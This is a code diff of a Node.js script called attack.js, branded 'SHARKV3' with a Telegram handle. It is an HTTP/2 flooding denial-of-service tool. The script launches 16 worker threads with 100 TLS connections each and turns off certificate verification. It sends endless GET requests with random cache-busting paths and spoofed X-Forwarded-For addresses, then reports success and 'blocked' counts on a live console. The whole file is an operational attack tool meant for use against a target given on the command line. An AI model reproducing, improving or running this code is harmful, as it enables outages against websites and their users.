@@ -1,135 +1,116 @@
 const http2 = require('http2');
+const tls = require('tls');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
-const readline = require('readline');
 const net = require('net');
+const readline = require('readline');
 
 const THREADS = 16;
-const INITIAL_CONNECTIONS =25;
-const POWER_MULTIPLIER = 3;
-const WARMUP_TIME = 10000;
-const MAX_INFLIGHT = 2000;
+const CONNECTIONS = 100;
+const DURATION = parseInt(process.argv[3]) || 60;
+const TARGET = process.argv[2];
 
-let totalRequests = 0;
-let successCount = 0;
-let errorCount = 0;
+let total = 0;
+let success = 0;
+let blocked = 0;
 let maxRps = 0;
-let rpsLastSecond = 0;
+let rps = 0;
+
+if (!TARGET || !DURATION) {
+  console.log('Usage: node attack.js <target> <duration_secs>');
+  process.exit(1);
+}
 
 if (isMainThread) {
-    if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
-        process.exit(1);
-    }
-
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3]);
-
+  console.clear();
+  console.log('Warming up for 5s...');
+  setTimeout(() => {
     console.clear();
-    console.log(`Warming up... Starting attack in 10s`);
+    console.log('SHARKV3 - T.ME/STSVKINGDOM');
+    console.log('===========================');
 
-    setTimeout(() => {
-        console.clear();
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
-
-        for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, initial: true } });
-        }
-
-        setTimeout(() => {
-            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-                new Worker(__filename, { workerData: { target, duration, initial: false } });
-            }
-        }, WARMUP_TIME);
-
-        // Live stats
-        setInterval(() => {
-            maxRps = Math.max(maxRps, rpsLastSecond);
-            renderStats();
-            rpsLastSecond = 0;
-        }, 1000);
-    }, WARMUP_TIME);
-
-    function renderStats() {
-        readline.cursorTo(process.stdout, 0, 0);
-        readline.clearScreenDown(process.stdout);
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
-        console.log(`total: ${totalRequests}`);
-        console.log(`max-r: ${maxRps}`);
-        console.log(`===========================`);
-        console.log(`succes: ${successCount}`);
-        console.log(`Blocked: ${errorCount}`);
+    for (let i = 0; i < THREADS; i++) {
+      new Worker(__filename, { workerData: { TARGET, DURATION } });
     }
+
+    setInterval(() => {
+      maxRps = Math.max(maxRps, rps);
+      displayStats();
+      rps = 0;
+    }, 1000);
 
     const server = net.createServer(socket => {
-        socket.on('data', data => {
-            const msg = data.toString();
-            if (msg === 'req') {
-                totalRequests++;
-                rpsLastSecond++;
-            } else if (msg === 'ok') {
-                successCount++;
-            } else if (msg === 'err') {
-                errorCount++;
-            }
-        });
+      socket.on('data', data => {
+        const msg = data.toString();
+        if (msg === 'ok') success++;
+        else if (msg === 'fail') blocked++;
+        total++;
+        rps++;
+      });
     });
     server.listen(9999);
+
+    function displayStats() {
+      readline.cursorTo(process.stdout, 0, 0);
+      readline.clearScreenDown(process.stdout);
+      console.log('SHARKV3 - T.ME/STSVKINGDOM');
+      console.log('===========================');
+      console.log(`total: ${total}`);
+      console.log(`max-r: ${maxRps}`);
+      console.log('===========================');
+      console.log(`succes: ${success}`);
+      console.log(`Blocked: ${blocked}`);
+    }
+  }, 5000);
+
 } else {
-    const { target, duration, initial } = workerData;
-    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
-    const end = Date.now() + duration * 1000;
+  const { TARGET, DURATION } = workerData;
+  const endTime = Date.now() + DURATION * 1000;
+  const socket = net.connect(9999, '127.0.0.1');
 
-    const socket = net.connect(9999, '127.0.0.1');
-    const sendStat = msg => socket.write(msg);
+  function sendStatus(msg) {
+    socket.write(msg);
+  }
 
-    function sendOne(client, inflight) {
-        if (Date.now() > end) return;
+  function flood(session) {
+    while (Date.now() < endTime) {
+      try {
+        const headers = {
+          ':method': 'GET',
+          ':path': `/${Math.random().toString(36).slice(2)}?${Date.now()}`,
+          'user-agent': 'Mozilla/5.0',
+          'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+        };
 
-        if (inflight.count >= MAX_INFLIGHT) {
-            return setTimeout(() => sendOne(client, inflight), 1);
-        }
-
-        try {
-            inflight.count++;
-            const req = client.request({ ':path': '/', ':method': 'GET' });
-            req.setNoDelay?.(true);
-            req.on('response', () => {
-                sendStat('ok');
-                inflight.count--;
-            });
-            req.on('error', () => {
-                sendStat('err');
-                inflight.count--;
-            });
-            req.end();
-            sendStat('req');
-        } catch {
-            inflight.count--;
-            sendStat('err');
-        }
-
-        setImmediate(() => sendOne(client, inflight));
+        const req = session.request(headers);
+        req.on('response', () => sendStatus('ok'));
+        req.on('error', () => sendStatus('fail'));
+        req.end();
+        sendStatus('req');
+      } catch (e) {
+        sendStatus('fail');
+      }
     }
+    session.close();
+  }
 
-    function createConnection() {
-        let client;
-        try {
-            client = http2.connect(target);
-            client.on('error', () => {});
-            client.on('close', () => setTimeout(createConnection, 100));
-            client.on('connect', () => {
-                const inflight = { count: 0 };
-                for (let i = 0; i < 100; i++) sendOne(client, inflight);
-            });
-        } catch {
-            setTimeout(createConnection, 250);
-        }
-    }
+  function createConnection() {
+    const tlsSocket = tls.connect(443, TARGET.replace('https://', '').replace('/', ''), {
+      ALPNProtocols: ['h2'],
+      ciphers: tls.DEFAULT_CIPHERS,
+      honorCipherOrder: true,
+      rejectUnauthorized: false,
+      servername: TARGET.replace('https://', '').replace('/', ''),
+    }, () => {
+      const session = http2.connect(TARGET, { createConnection: () => tlsSocket });
+      session.on('error', () => {});
+      flood(session);
+    });
 
-    for (let i = 0; i < connections; i++) {
-        createConnection();
-    }
+    tlsSocket.on('error', () => {});
+  }
+
+  for (let i = 0; i < CONNECTIONS; i++) {
+    createConnection();
+  }
 }
